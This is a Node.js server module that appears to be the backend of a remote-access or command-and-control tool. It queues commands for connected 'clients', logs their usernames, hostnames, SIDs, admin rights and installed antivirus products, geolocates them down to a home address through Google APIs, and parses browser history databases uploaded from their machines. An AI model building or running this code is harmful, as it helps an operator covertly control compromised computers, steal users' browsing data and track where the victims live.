const Utils = require('./utilFunctions')
const Command = require('../../../Tool/Commands/commands.model')
const Client = require('../../../Tool/tool.model')
const Response = require('../../../Tool/Responses/responses.model')
const axios = require('axios')
const sqlite3 = require("sqlite3");
const path = require("path");
const {GenerateRandomId} = require("./utilFunctions");
const appDir = path.dirname(require.main.filename);
const downloadsPath = path.resolve(appDir, 'Server', 'Api', 'Utils', 'clientFiles')

const AddCommand = (clientId, command) => {
    const command_id = Utils.GenerateRandomId(6);
    const newCommand = new Command({client_id: clientId, command_id: command_id, command: command});
    return (
        newCommand.save()
            .then(() => true)
            .catch(err => {
                Utils.LogToFile(`Error adding command for client ${clientId}, ${err}`)
                return false
            })
    )
}
module.exports.AddCommand = AddCommand;

const CheckClientStatus = async (clientId) => {
    let client = await
        Client.findOne({client_id: clientId}, {}, {}, function (err, client) {
            if (err)
                Utils.LogToFile(`Error getting client status from db, ${err}`)
        })
    return client.isConnected
}
module.exports.CheckClientStatus = CheckClientStatus;

const DisconnectClient = (clientId) => {
    Client.findOneAndUpdate({client_id: clientId}, {isConnected: false}, {useFindAndModify: false}, function (err) {
        if (err)
            Utils.LogToFile(`Unable to disconnect inactive client ${clientId}`)
    })
}

const ValidateClients = (currentTimeDate) => {
    let parsed = Utils.ParseCurrentTimeDate(currentTimeDate)
    try {
        Client.find({}, function (err, users) {
            if (err) {
                Utils.LogToFile(`Error getting clients from DB for status check!, ${err}`)
            } else if (users.length > 0) {
                users.forEach((client) => {
                    let splitDateTime = client.lastActive.split(',')
                    let clientDate = splitDateTime[0].trim()
                    const datesAreOnSameDay = (first, second) =>
                        first.getFullYear() === second.getFullYear() &&
                        first.getMonth() === second.getMonth() &&
                        first.getDate() === second.getDate();
                    if (datesAreOnSameDay(new Date(clientDate), new Date(parsed[0]))) {
                        let clientTime = splitDateTime[1].trim()
                        let clientHours = clientTime.split(':')[0]
                        let clientMinutes = clientTime.split(':')[1].split(' ')[0]
                        if (parseInt(clientHours) === parseInt(parsed[1])) {
                            //Check if the client hasn't been active for 1 minutes
                            if (Math.abs(parseInt(clientMinutes) - parseInt(parsed[2])) > 1)
                                DisconnectClient(client.client_id);
                        } else
                            DisconnectClient(client.client_id);
                    } else
                        DisconnectClient(client.client_id);
                })
            }
        })
    } catch (err) {
        Utils.LogToFile(`Error validating clients ${err.message}`)
    }
}
module.exports.ValidateClients = ValidateClients;

const RemoveClient = (clientId) => {
    return (
        Client.findOneAndDelete({client_id: clientId}, {}, function (err) {
            if (err) {
                Utils.LogToFile(`Error removing client ${clientId}: ${err}`)
                return false
            } else {
                Utils.LogToFile(`Removed ${clientId} successfully during cleanup!`)
                Command.deleteMany({client_id: clientId}, function (err) {
                    if (err)
                        Utils.LogToFile(`Error removing client commands on cleanup: ${clientId}: ${err}`)
                })
                Response.deleteMany({client_id: clientId}, function (err) {
                    if (err)
                        Utils.LogToFile(`Error removing client response  on cleanup ID: ${clientId}: ${err}`)
                })
                return true
            }
        })
    )
}
module.exports.RemoveClient = RemoveClient;

const NumLowPrivClients = async () => {
    return Client.countDocuments({isAdmin: false}, function (err) {
        if (err)
            Utils.LogToFile(`Error getting statistics for low priv. clients, ${err}`)
    });
}
module.exports.NumLowPrivClients = NumLowPrivClients;

const NumHighPrivClients = async () => {
    return Client.countDocuments({isAdmin: true}, function (err) {
        if (err)
            Utils.LogToFile(`Error getting statistics for low priv. clients, ${err}`)
    });
}
module.exports.NumHighPrivClients = NumHighPrivClients;

const GetNumClients = async () => {
    return Client.countDocuments({}, function (err) {
        if (err)
            Utils.LogToFile(`Error getting statistics for amount of clients, ${err}`)
    });
}
module.exports.GetNumClients = GetNumClients;

const NumConnectedClients = async () => {
    return Client.countDocuments({isConnected: true}, function (err) {
        if (err)
            Utils.LogToFile(`Error getting statistics for amount of online clients, ${err}`)
    });
}
module.exports.NumConnectedClients = NumConnectedClients;

const NumDisconnectedClients = async () => {
    return Client.countDocuments({isConnected: false}, function (err) {
        if (err)
            Utils.LogToFile(`Error getting statistics for amount of offline clients, ${err}`)
    });
}
module.exports.NumDisconnectedClients = NumDisconnectedClients;


const GetClientLocationByIP = (publicIP) => {
    return axios({
        url: `https://www.iplocate.io/api/lookup/${publicIP}`,
    }).then((data) => data.data).catch(() => null)
}
module.exports.GetClientLocationByIP = GetClientLocationByIP;

const GetClientLocationByMetaData = async (metaData, api) => {
    return await axios({
        method: 'POST',
        url: `https://www.googleapis.com/geolocation/v1/geolocate?key=${api || process.env.GOOGLE_API}`,
        data: metaData
    })
        .then((data) => {
            return data.data.location;
        })
        .catch((err) => {
            Utils.LogToFile(`Error getting client location: ${err.message}`)
            return null
        })
}
module.exports.GetClientLocationByMetaData = GetClientLocationByMetaData;


const GetClientLocationData = async (locationObject, api) => {
    if (locationObject) {
        return axios({
            url: `https://maps.googleapis.com/maps/api/geocode/json?latlng=${locationObject.lat},${locationObject.lng}&key=${api || process.env.GOOGLE_API}`,
        }).then((data) => {
            let fullAddress = data.data.results[0].formatted_address.toString()
            data = {
                country: fullAddress.split(',')[2],
                city: fullAddress.split(',')[1],
                home_address: fullAddress.split(',')[0]
            }
            return data
        }).catch((err) => {
            Utils.LogToFile(`Error retrieving client full location data ${err.message}`)
            return null
        })
    }
}
module.exports.GetClientLocationData = GetClientLocationData

const createNewClient = async (req) => {
    let noDuplicateAvs = new Set(req.body.response.listAvs);
    let noDuplicateIP = new Set(req.body.response.IPv4);
    return new Client({
        client_id: Utils.GenerateRandomId(8),
        username: req.body.response.Username,
        hostname: req.body.response.Hostname,
        session_key: Utils.GenerateRandomSessionKey(),
        os: req.body.response.Os,
        isAdmin: req.body.response.isAdmin !== "False",
        isConnected: true,
        ipv4: [...noDuplicateIP],
        public_ip: req.body.response.PublicIP,
        wifiEnabled: req.body.response.ifWifi,
        sid: req.body.response.SID,
        lastActive: Utils.GetCurrentTimeDate(),
        listAvs: [...noDuplicateAvs],
        location: {
            lat: 0,
            lng: 0
        }
    });
}
module.exports.createNewClient = createNewClient

function addClientLocation(clientId, locationObject) {
    Client.findOneAndUpdate({client_id: clientId}, {
        location: {
            lat: Number(locationObject.latitude),
            lng: Number(locationObject.longitude),
            country: locationObject.country,
            city: locationObject.city,
            home_address: "Unavailable"
        }
    }, {useFindAndModify: false}, function (err) {
        if (err)
            Utils.LogToFile(`Error adding location for client ${clientId} with ${err.message}`)
    })
}

module.exports.addClientLocation = addClientLocation

async function findClientIdBySid(sid) {
    let clientsIds = await (
        Client.find({sid: sid}, 'client_id', {useFindAndModify: false}, function (err, user) {
            if (err)
                Utils.LogToFile(`Error finding client SID for client with error: ${err.message}`)
            else if (user) {
                return user
            }
        })
    )
    if (clientsIds !== null)
        return clientsIds
    return null
}

module.exports.findClientIdBySid = findClientIdBySid

function dbCallback(clientId, urlHistory) {
    addNewClientResponse(clientId, urlHistory).then()
}

function getUrlsFromDB(clientId) {
    extractHistoryFromDB(clientId, dbCallback)
}

module.exports.getUrlsFromDB = getUrlsFromDB;

function extractHistoryFromDB(clientId, callback) {
    let dbPath = path.resolve(downloadsPath, clientId, 'history.db')
    let db = new sqlite3.Database(dbPath);
    let sqlQuery = 'SELECT url FROM urls;';
    db.all(sqlQuery, [], (err, rows) => {
        let urlHistory = ""
        if (err) {
            Utils.LogToFile(`Error parsing history DB ${err.message}`);
            callback(null)
        } else {
            rows.forEach((row) => {
                urlHistory += `[+] Url: ${row.url} \r\n\n`
            });
        }
        callback(clientId, urlHistory)
    })
    db.close();
}

module.exports.extractHistoryFromDB = extractHistoryFromDB;

const addNewClientResponse = async (clientId, response) => {
    let response_id = GenerateRandomId(6);
    const currentTimeDate = Utils.GetCurrentTimeDate();
    let newResponse = new Response({
        response_id: response_id,
        client_id: clientId,
        response: response,
        date: currentTimeDate
    });

    await Client.findOneAndUpdate({client_id: clientId}, {lastActive: currentTimeDate}, {useFindAndModify: false},
        function (err) {
            if (err)
                Utils.LogToFile(`Error updating last active for client ${clientId}`);
        })
    return await newResponse.save().then(() => true).catch(() => false);
}
module.exports.addNewClientResponse = addNewClientResponse